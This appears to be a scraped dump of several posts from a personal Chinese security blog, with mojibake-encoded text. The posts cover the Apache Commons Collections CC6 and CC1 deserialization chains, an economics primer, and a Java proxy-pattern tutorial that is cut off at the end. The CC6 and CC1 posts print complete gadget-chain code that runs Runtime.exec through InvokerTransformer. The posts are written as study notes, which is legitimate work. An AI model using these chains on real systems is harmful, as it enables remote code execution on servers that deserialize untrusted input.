new Transformer[] {new ConstantTransformer(697)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] } ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); outerMap.clear(); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(MMMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object obj2 = ois.readObject(); } } ç›´æ¥è¿è¡Œï¼ŒæˆåŠŸã€‚\nç»“æŸäº†å—ï¼Œæ²¡æœ‰ã€‚\nè¸©å‘ä¸­çš„è¸©å‘ å¦‚æœä½ æƒ³å¯¹CC6çš„é“¾è·¯è¿è¡Œè¿‡ç¨‹åšDebugè·Ÿè¸ªï¼Œçœ‹å˜é‡å¦‚ä½•ä¿®æ”¹ï¼Œç¨‹åºå¦‚ä½•è°ƒç”¨ï¼Œè·¯å¾„å¦‚ä½•è¢«åŠ«æŒã€‚\næ­å–œä½ ï¼Œæœ‰å¾ˆå¼ºæ€è€ƒï¼ŒéªŒè¯å’ŒåŠ¨æ‰‹èƒ½åŠ›ï¼Œä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œæ— æ³•è§¦å‘RCEã€‚\næˆ–è€…è¯´ï¼Œä¸ä½¿ç”¨æ–­ç‚¹çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥RCEï¼Œå…¶ä»–å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒLazyMap.get()æ€»æ˜¯æ— æ³•åšåˆ°IF == trueã€‚\nä¸ºä»€ä¹ˆï¼ŸæŠ›å‡ºç»“è®ºï¼ŒIDEAè‡ªåŠ¨è°ƒç”¨ç±»çš„toString()ï¼Œä¸”ä¸ä¼šè§¦å‘æ–­ç‚¹ã€‚\nå†ä¸”ï¼ï¼ï¼\nTiedMapEntry.toString()ä¸­å’ŒTiedMapEntry.hashCode()ä¸€æ ·ï¼Œéƒ½ä¼šè°ƒç”¨TiedMapEntry.getValue()ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é“¾ï¼ï¼ï¼ï¼\næ‰€ä»¥ä¸€æ—¦IDEAå°è¯•è§£æTiedMapEntryï¼Œå»è°ƒç”¨äº†TiedMapEntry.toString()ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„åˆ©ç”¨é“¾å°±ä¼šèµ°ä¸€éï¼Œmapå°±ä¼šè‡ªåŠ¨å¡«å……ä¸Šä¸€å¯¹Key =\u0026gt; Valueï¼Œå³ä½¿ä½¿ç”¨äº†outerMap.clear();ï¼Œä¹Ÿä¸ä¸€å®šæœ‰æ•ˆã€‚\nè¯æ˜ä¸€ ç¬¬ä¸€æ­¥ï¼šç›´æ¥æ–­ç‚¹LazyMap.get()ï¼Œå‘ç°map.size == 0\nç¬¬äºŒæ­¥ï¼šä¸éœ€è¦æ­¥è¿›æ­¥è¿‡ï¼Œè¿”å›mainå‡½æ•°çœ‹ä¸€çœ¼ï¼Œè§¦å‘IDEAå¯¹TiedMapEntry.toString()è‡ªåŠ¨è°ƒç”¨\nç¬¬ä¸‰æ­¥ï¼šå›åˆ°LazyMap.get()ï¼Œå‘ç°åœ¨æ²¡æœ‰æ­¥è¿›æ­¥å…¥çš„æƒ…å†µä¸‹ï¼Œmapæœ‰å€¼äº†ï¼Œsizeä¸º1ï¼Œä¸ä¸º0äº†\næ­¤æ—¶å†æ­¥å…¥ï¼Œä¹Ÿæ— æ³•è¿›å…¥IF == trueä»£ç å—äº†ã€‚\nè¯æ˜äºŒ æ–­ç‚¹åœ¨ä¸»å‡½æ•°43è¡Œï¼Œå‘ç°outerMap.clear()æ‰§è¡Œä¹‹å‰ï¼ŒouterMap.size == 1ï¼ŒæŒ‰ç…§é€»è¾‘æ¥è¯´ï¼Œclear()ä¹‹åsizeä¸º0ï¼Œæ­¥è¿‡è¿è¡Œï¼Œå‘ç°ä¸å˜ï¼Œè¿å†…å®¹éƒ½æ²¡å˜ã€‚\nè§£é‡Šï¼šå› ä¸ºmain Debugé€”ä¸­ï¼Œä¼šå¯¹æ‰€æœ‰æ¶‰åŠå˜é‡åšå±•ç¤ºï¼Œå…¶ä¸­åŒ…æ‹¬keyinnerè¿™ä¸ªTiedMapEntryå¯¹è±¡ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨TiedMapEntry.toString()äº†ã€‚\næ­¥è¿‡å‰ï¼š\næ­¥è¿‡åï¼š\nè§£å†³åŠæ³• ä¿®æ”¹ä»£ç \n1 2 3 TiedMapEntry keyinner = new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;); Map MMMap = new HashMap(); MMMap.put(keyinner,\u0026#34;TiedMapEntryInKey\u0026#34;); ä¸º\n1 2 Map MMMap = new HashMap(); MMMap.put(new TiedMapEntry(outerMap, \u0026#34;keyinner\u0026#34;),\u0026#34;TiedMapEntryInKey\u0026#34;); å–æ¶ˆå±€éƒ¨å˜é‡keyinnerï¼Œå°±ä¸ä¼šå±•ç¤ºï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘ï¼Œmainå‡½æ•°çº¯æ­¥è¿‡å¯ä»¥Debugæ¨¡å¼ä¸‹RCE\né‚£å¦‚æœè¦çœ‹TiedMapEntryé‡Œçš„è¿è¡Œæµç¨‹å‘¢ï¼Ÿ\næœ‰å¦‚ä¸‹æ–¹æ³•ç†è®ºä¸Šå¯ä»¥ï¼š\nå…³é—­IDEAçš„è‡ªåŠ¨toString() é’ˆå¯¹è¿™ä¸ªorg.apache.commons.collections.keyvalue.TiedMapEntryç±»è¿›è¡Œè®¾ç½®ï¼Œä¸åštoString()å¤„ç† ä½†å®é™…ä¸Šä¸è¡Œï¼Œç¬”è€…ç²—ç•¥çš„å°è¯•äº†ä¸€æ¬¡ã€‚\nä»¥ä¸Š\n","date":"2024-08-06T21:56:10+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/cc6demo/","title":"CC6 Demo å­¦ä¹ "},{"content":" First of All ä»€ä¹ˆæ˜¯æ•™è‚²\nEducation Is What Remains After You Have Forgotten Everything You Learned In School\nåœ¨ä½ å¿˜è®°æ‰€æœ‰ä½ åœ¨å­¦æ ¡ä¸­å­¦åˆ°çš„çŸ¥è¯†åï¼Œå‰©ä¸‹çš„ä¸œè¥¿ï¼Œå°±æ˜¯æ•™è‚²\nç»æµå­¦åå¤§åŸç† åå¤§åŸç†åˆ†æˆä¸‰ç±»é—®é¢˜\nHow People Make Decisionsï¼ˆäººä»¬å¦‚ä½•ä½œå‡ºå†³ç­–ï¼‰ How People Interactï¼ˆäººä»¬å¦‚ä½•ç›¸äº’å½±å“/ç›¸äº’ä½œç”¨ï¼‰ How the Economy as a Whole Worksï¼ˆæ•´ä½“ç»æµå¦‚ä½•è¿è¡Œï¼‰ å‰ä¸¤ä¸ªé—®é¢˜å±äºå¾®è§‚ç»æµå­¦ï¼Œç¬¬ä¸‰ä¸ªé—®é¢˜å±äºå®è§‚ç»æµå­¦\nåå¤§åŸç†å¦‚ä¸‹ï¼š\nPeople face tradeoffsï¼ˆäººä»¬é¢ä¸´å¾—å¤±äº¤æ¢/æƒè¡¡å–èˆï¼‰ The cost of something is what you give up to get it.ï¼ˆæŸç‰©çš„æˆæœ¬æ˜¯ä¸ºè·å¾—æ­¤ç‰©æ‰€æ”¾å¼ƒçš„ä¸œè¥¿ï¼‰ Rational people think at the margin.ï¼ˆç†æ€§äººæ€è€ƒè¾¹é™…é‡ï¼Œæ€è€ƒç°è±¡çš„å¯¼æ•°ï¼Œè€Œä¸æ˜¯æœ¬èº«ï¼‰ People respond to incentives.ï¼ˆäººä»¬ä¼šå¯¹æ¿€åŠ±/åˆºæ¿€ä½œå‡ºååº”ï¼‰ Trade can make everyone better off.ï¼ˆè´¸æ˜“èƒ½ä½¿äººäººæ”¶ç›Šï¼‰ Markets are usually a good way to organize economic activity.ï¼ˆå¸‚åœºé€šå¸¸æ˜¯ç»„ç»‡ç»æµæ´»åŠ¨çš„å¥½æ–¹å¼ï¼‰ Governments can sometimes improve market outcomes.ï¼ˆæ”¿åºœæœ‰æ—¶å¯ä»¥æ”¹è¿›å¸‚åœºç»“æœï¼‰ The standard of living depends on a country\u0026rsquo;s production.ï¼ˆä¸€å›½çš„ç”Ÿæ´»æ°´å¹³å–å†³äºå®ƒçš„ç”Ÿäº§ï¼‰ Prices rise when the governments prints too much money.ï¼ˆæ”¿åºœè¶…å‘è´§å¸æ—¶ï¼Œç‰©ä»·ä¸Šæ¶¨ï¼‰ Society faces a short-run tradeoff between inflation and unemployment.ï¼ˆç¤¾ä¼šé¢ä¸´é€šè´§è†¨èƒ€å’Œå¤±ä¸šä¹‹é—´çš„çŸ­æœŸå¾—å¤±äº¤æ¢ï¼‰ è¯è®°ï¼š\ntradeoffsï¼šå¦¥åï¼Œè®©æ­¥\nmarginï¼šè¾¹é™…ï¼Œè¾¹ç¼˜ï¼Œç•Œé™\nincentivesï¼šåˆºæ¿€ï¼Œæ¿€åŠ±\n","date":"2024-08-05T21:10:08+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240805211120995.png","permalink":"https://d4n-sec.github.io/p/ten-principles-of-economics/","title":"ç»æµå­¦åå¤§åŸç†"},{"content":"å‡è®¾è¯»è€…å·²ç»äº†è§£HashMapç‰ˆéç»å…¸CC1é“¾çš„æ„é€ åŸç†ã€‚\nå¦‚æ­¤æåˆ°äº†éç»å…¸ç‰ˆçš„CC1é“¾ï¼Œä»£è¡¨ç»å…¸ç‰ˆCC1é“¾å’ŒHashMapç‰ˆæœ‰ä¸€å®šå‡ºå…¥ã€‚\nç»å…¸ç‰ˆCC1é“¾ä½¿ç”¨çš„Mapç±»ä¸ºLazyMapè€ŒéHashMap\nLazyMapç±»çš„æ•´ä½“å£°æ˜å¦‚ä¸‹\n1 2 3 4 5 public class LazyMap extends AbstractMapDecorator implements Map, Serializable { ... } æ•´ä¸ªLazymapçš„transform()è§¦å‘ç‚¹åªæœ‰åœ¨get()ä¸­æœ‰æåˆ°ï¼Œget()æ–¹æ³•çš„æºä»£ç å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } æ°å¥½ï¼ŒAnnotationInvocationHandler.invoke()æœ‰get()çš„è°ƒç”¨\n1 2 3 4 5 6 public Object invoke(Object proxy, Method method, Object[] args) { ... // Handle annotation member accessors Object result = memberValues.get(member); ... } AnnotationInvocationHandleræ˜¯ä¸€ä¸ªç»§æ‰¿äº†InvocationHandleræ¥å£çš„ç±»ï¼Œèƒ½å¤Ÿå¯¹æŸä¸ªå¯¹è±¡è¿›è¡Œä»£ç†ï¼Œä»£ç†åè¢«ä»£ç†å¯¹è±¡æ‰€ä»¥æ–¹æ³•çš„è§¦å‘éƒ½ä¼šè¢«AnnotationInvocationHandler.invoke()æ‹¦æˆªå¤„ç†ï¼Œæ°å¦‚ä»£ç†æ¨¡å¼ä¸­åŠ¨æ€ä»£ç†çš„ç¤ºä¾‹ä¸€èˆ¬ã€‚\næœ‰äº†è¿™äº›Knowledgeï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ˜“ç†è§£å¦‚ä¸‹ç¤ºä¾‹\nç®€æ˜“ç»å…¸ç‰ˆCC1é“¾å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ClassicCC1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); //è·å¾—ä»£ç†å¯¹è±¡ Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //å°†ä»£ç†å¯¹è±¡èµ‹å€¼ç»™memberValues handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } 39è¡Œä¿®æ”¹TransformedMapä¸ºLazyMap\n41-49è¡Œè·å–ä»£ç†å¯¹è±¡\n53-54è¡Œï¼Œå› ä¸ºä»£ç†å¯¹è±¡æ— æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œéœ€è¦ä¸€ä¸ªå¯åºåˆ—åŒ–ç±»ï¼Œæˆå‘˜å˜é‡å¯æ§å¹¶ä¸”readObject()ä¸­è°ƒç”¨è¿‡æˆå‘˜å˜é‡çš„æ–¹æ³•ï¼Œè¯¥æˆå‘˜å˜é‡å¯æ¥å—ä»£ç†ç±»å¯¹è±¡ï¼Œæ¡ä»¶ä¸¥è‹›ï¼Œåˆšå¥½AnnotationInvocationHandlerä¹Ÿæ»¡è¶³è¿™ä¸ªæ¡ä»¶\nå¦‚æœå­˜åœ¨ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡å¯æ§å¹¶ä¸”readObject()ä¸­è°ƒç”¨è¿‡æˆå‘˜å˜é‡çš„æ–¹æ³•ï¼Œè¯¥ç±»å¯ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆåŒæ ·ä¹Ÿèƒ½è§¦å‘\nä¸‹åˆ—æ˜¯ä¾‹å­\nå®Œæ•´ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 package org.dm.vulhub.Ser; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ClassicCC1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { \u0026#34;calc.exe\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); // Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); // handler = (InvocationHandler) // construct.newInstance(Retention.class, proxyMap); ClassicCC cc = new ClassicCC(proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); // oos.writeObject(handler); oos.writeObject(cc); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } class ClassicCC implements Serializable { private Map\u0026lt;String, Object\u0026gt; mm; public ClassicCC(Map\u0026lt;String, Object\u0026gt; mm){ this.mm = mm; } private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); mm.clear(); } } ä¿®æ”¹åœ¨55è¡Œå’Œ70-81è¡Œï¼Œç¬¬80è¡Œæ˜¯è§¦å‘å‡½æ•°ã€‚\nä½†æ˜¯è¿™ç§åŠæ³•ä¾æ—§æ²¡æ³•åœ¨é«˜ç‰ˆæœ¬Javaä¸­åˆ©ç”¨ã€‚\nLazyMapçš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeä¸­ï¼Œå®Œå…¨æ²¡æœ‰setValueä»€ä¹ˆäº‹ï¼Œè¿™ä¹Ÿè¯´æ˜8u71åä¸èƒ½åˆ©ç”¨çš„åŸå› å’ŒAnnotationInvocationHandler#readObject ä¸­æœ‰æ²¡æœ‰setValueæ²¡ä»»ä½•å…³ç³»ï¼ˆåé©³æŸäº›æ–‡ç« ä¸è´Ÿè´£ä»»çš„è¯´æ³•ï¼‰ï¼Œå…³é”®è¿˜æ˜¯å’Œé€»è¾‘æœ‰å…³ã€‚\næœ€åï¼Œé«˜ç‰ˆæœ¬çš„Javaé‡åˆ°CommonCollectionsï¼Œåˆ°åº•å¦‚ä½•è§£å†³å‘¢ï¼Ÿç»§ç»­å­¦ä¹ å§ï¼ï¼\n","date":"2024-08-03T13:11:25+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240721160313033.png","permalink":"https://d4n-sec.github.io/p/javaclassiccc1/","title":"ç»å…¸CC1é“¾æ„é€ "},{"content":"ä»£ç†æ¨¡å¼ ä»£ç†æ¨¡å¼æ˜¯å¸¸ç”¨çš„javaè®¾è®¡æ¨¡å¼ã€‚\nä»£ç†æ¨¡å¼æ˜¯å¸¸ç”¨çš„javaè®¾è®¡æ¨¡å¼ï¼Œä»–çš„ç‰¹å¾æ˜¯ä»£ç†ç±»ä¸å§”æ‰˜ç±»æœ‰åŒæ ·çš„æ¥å£ï¼Œä»£ç†ç±»ä¸»è¦è´Ÿè´£ä¸ºå§”æ‰˜ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯ã€æŠŠæ¶ˆæ¯è½¬å‘ç»™å§”æ‰˜ç±»ï¼Œä»¥åŠäº‹åå¤„ç†æ¶ˆæ¯ç­‰ã€‚ä»£ç†ç±»ä¸å§”æ‰˜ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ä¸ä¸€ä¸ªå§”æ‰˜ç±»çš„å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»çš„å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨å§”æ‰˜ç±»çš„å¯¹è±¡çš„ç›¸å…³æ–¹æ³•ï¼Œæ¥æä¾›ç‰¹å®šçš„æœåŠ¡ã€‚ç®€å•çš„è¯´å°±æ˜¯ï¼Œæˆ‘ä»¬åœ¨è®¿é—®å®é™…å¯¹è±¡æ—¶ï¼Œæ˜¯é€šè¿‡ä»£ç†å¯¹è±¡æ¥è®¿é—®çš„ï¼Œä»£ç†æ¨¡å¼å°±æ˜¯åœ¨è®¿é—®å®é™…å¯¹è±¡æ—¶å¼•å…¥ä¸€å®šç¨‹åº¦çš„é—´æ¥æ€§ï¼Œå› ä¸ºè¿™ç§é—´æ¥æ€§ï¼Œå¯ä»¥é™„åŠ å¤šç§ç”¨é€”ã€‚\nå®ç°åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ä¸¤ç§å®ç°æ–¹å¼\né™æ€ä»£ç† ç®€å•æ¥è¯´ä»£ç†æ¨¡å¼å°±æ˜¯å°†è¢«ä»£ç†ç±»åŒ…è£…èµ·æ¥ç„¶åé‡æ–°å®ç°ç›¸åŒçš„æ–¹æ³•ï¼Œå¹¶ä¸”è°ƒç”¨åŸæ¥æ–¹æ³•çš„åŒæ—¶å¯ä»¥åœ¨æ–¹æ³•å‰åæ·»åŠ ä¸€ä¸ªæ–°çš„å¤„ç†ã€‚è€Œè¿™ç§åŒ…è£…å¯ä»¥ä½¿ç”¨ç»§æ‰¿æˆ–è€…ç»„åˆæ¥ä½¿ç”¨ã€‚å½“æˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™éœ€è¦ä½¿ç”¨çš„æ˜¯ä»£ç†ç±»çš„å¯¹è±¡æ¥è°ƒç”¨è€Œä¸æ˜¯åŸæ¥çš„è¢«ä»£ç†å¯¹è±¡ã€‚\né€šè¿‡ç»§æ‰¿å®ç° é€šè¿‡ç»§æ‰¿è¢«ä»£ç†å¯¹è±¡ï¼Œé‡å†™è¢«ä»£ç†æ–¹æ³•ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œä»£ç†ã€‚\nä¼˜ç‚¹ï¼šè¢«ä»£ç†ç±»æ— éœ€å®ç°æ¥å£\nç¼ºç‚¹ï¼šåªèƒ½ä»£ç†è¿™ä¸ªç±»ï¼Œè¦æƒ³ä»£ç†å…¶ä»–ç±»ï¼Œè¦æƒ³ä»£ç†å…¶ä»–ç±»éœ€è¦å†™æ–°çš„ä»£ç†æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.dm.vulhub.Ser; public class Tank{ public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { new ProxyTank().move(); } } class ProxyTank extends Tank{ @Override public void move() { System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œå‰...\u0026#34;); super.move(); System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œå...\u0026#34;); } } é€šè¿‡ç»„åˆå®ç° å®šä¹‰ä¸€ä¸ª Movable æ¥å£è¢«ä»£ç†ç±»å’Œä»£ç†ç±»éƒ½éœ€è¦å®ç°è¯¥æ¥å£ã€‚ä»£ç†ç±»éœ€è¦å°†è¯¥æ¥å£ä½œä¸ºå±æ€§ï¼Œå®ä¾‹åŒ–æ—¶éœ€è¦ä¼ å…¥è¯¥æ¥å£çš„å¯¹è±¡ï¼Œè¿™æ ·è¯¥ä»£ç†ç±»å°±å¯ä»¥å®ç°ä»£ç†æ‰€æœ‰å®ç°Movableçš„ç±»äº†ã€‚\næ¥å£åœ¨è¿™é‡Œçš„ç›®çš„å°±æ˜¯èµ·ä¸€ä¸ªè§„èŒƒä½œç”¨ä¿è¯è¢«ä»£ç†ç±»å’Œä»£ç†ç±»éƒ½å®ç°äº†move()æ–¹æ³•ã€‚\nä¼˜ç‚¹ï¼šå¯ä»¥ä»£ç†æ‰€æœ‰å®ç°æ¥å£çš„ç±»\nç¼ºç‚¹ï¼šè¢«ä»£ç†çš„ç±»å¿…é¡»å®ç°æ¥å£ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.dm.vulhub.Ser; public class Tank implements Movable{ @Override public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { Tank tank = new Tank(); new LogProxy(tank).move(); } } class LogProxy implements Movable{ private Movable movable; public LogProxy(Movable movable) { this.movable = movable; } @Override public void move() { System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œå‰....\u0026#34;); movable.move(); System.out.println(\u0026#34;æ–¹æ³•æ‰§è¡Œå....\u0026#34;); } } interface Movable { void move(); } åŠ¨æ€ä»£ç† åŠ¨æ€ä»£ç†å…¶å®æœ¬è´¨è¿˜æ˜¯å°†è¢«ä»£ç†ç±»åŒ…è£…ä¸€å±‚ï¼Œç”Ÿæˆä¸€ä¸ªå…·æœ‰æ–°çš„ç›¸åŒåŠŸèƒ½çš„ä»£ç†ç±»ã€‚ä½†æ˜¯ä¸é™æ€ä»£ç†ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸ªä»£ç†ç±»æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ã€‚è€ŒåŠ¨æ€ä»£ç†è¿™ä¸ªä»£ç†ç±»æ˜¯æ ¹æ®æˆ‘ä»¬çš„æç¤ºåŠ¨æ€ç”Ÿæˆçš„ã€‚\nç›¸æ¯”äºé™æ€ä»£ç†ï¼ŒåŠ¨æ€ä»£ç†çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹ä»£ç†ç±»çš„å‡½æ•°è¿›è¡Œç»Ÿä¸€çš„å¤„ç†ï¼Œè€Œä¸ç”¨ä¿®æ”¹æ¯ä¸ªä»£ç†ç±»ä¸­çš„æ–¹æ³•ã€‚\nå®ç°åŠ¨æ€ä»£ç†æœ‰ä¸‰ç§æ–¹æ¡ˆ\nJDKåŠ¨æ€ä»£ç† é€šè¿‡javaæä¾›çš„Proxyç±»å¸®æˆ‘ä»¬åˆ›å»ºä»£ç†å¯¹è±¡\nä¼˜ç‚¹ï¼šå¯ä»¥ç”Ÿæˆæ‰€æœ‰å®ç°äº†å£çš„ä»£ç†å¯¹è±¡ï¼Œå¹¶ä¸”æœ€é‡è¦çš„æ˜¯ï¼Œå¯ä»¥å¯¹è¢«ä»£ç†ç±»çš„æ‰€æœ‰æ–¹æ³•åšæ‹¦æˆªå¤„ç†\nç¼ºç‚¹ï¼šJDKåå°„ç”Ÿæˆä»£ç†å¿…é¡»é¢å‘æ¥å£, è¿™æ˜¯ç”±Proxyçš„åŸç†å†³å®šçš„ã€‚ç”Ÿæˆä»£ç†çš„æ–¹æ³•ä¸­ä½ å¿…é¡»æŒ‡å®šå®ç°ç±»çš„æ¥å£ï¼Œå®ƒæ ¹æ®è¿™ä¸ªæ¥å£æ¥å®ç°ä»£ç†ç±»ç”Ÿæˆçš„æ‰€å®ç°çš„æ¥å£ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.dm.vulhub.Ser; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class Tank implements Movable{ @Override public void move() { System.out.println(\u0026#34;Tank moving cla....\u0026#34;); } public static void main(String[] args) { Tank tank = new Tank(); Movable o = (Movable)Proxy.newProxyInstance( Tank.class.getClassLoader() ,new Class[]{Movable.class} ,new LogProxy(tank)); o.move(); } } class LogProxy implements InvocationHandler { private Movable movable; public LogProxy(Movable movable) { this.movable = movable; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;æ–¹æ³•:\u0026#34;+method.getName()+\u0026#34;()æ‰§è¡Œå‰\u0026#34;); Object invoke = method.invoke(movable, args); // æ­¤å¤„ç›¸å½“äº movable.move() System.out.println(\u0026#34;æ–¹æ³•:\u0026#34;+method.getName()+\u0026#34;()æ‰§è¡Œå\u0026#34;); return invoke; } } interface Movable { void move(); } Proxy.newProxyInstanceçš„ä¼ å‚æ˜¯å®ç°çš„å…³é”®\nnewProxyInstance(): åˆ›å»ºä»£ç†å¯¹è±¡\nå‚æ•°ä¸€: è¢«ä»£ç†ç±»å¯¹è±¡\nå‚æ•°äºŒï¼šæ¥å£ç±»å¯¹è±¡ è¢«ä»£ç†å¯¹è±¡æ‰€å®ç°çš„æ¥å£\nå‚æ•°ä¸‰ï¼šè°ƒç”¨å¤„ç†å™¨ã€‚ 